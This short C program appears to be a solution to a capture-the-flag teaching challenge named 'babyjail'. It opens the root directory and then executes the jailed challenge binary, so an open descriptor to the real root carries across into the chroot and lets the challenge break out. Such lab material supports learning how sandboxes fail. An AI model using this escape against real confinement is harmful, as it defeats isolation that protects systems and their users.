#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int main(void)
{
    open("/", O_RDONLY);
    execve("/babyjail_level8_teaching1", NULL, NULL);
    return 0;
}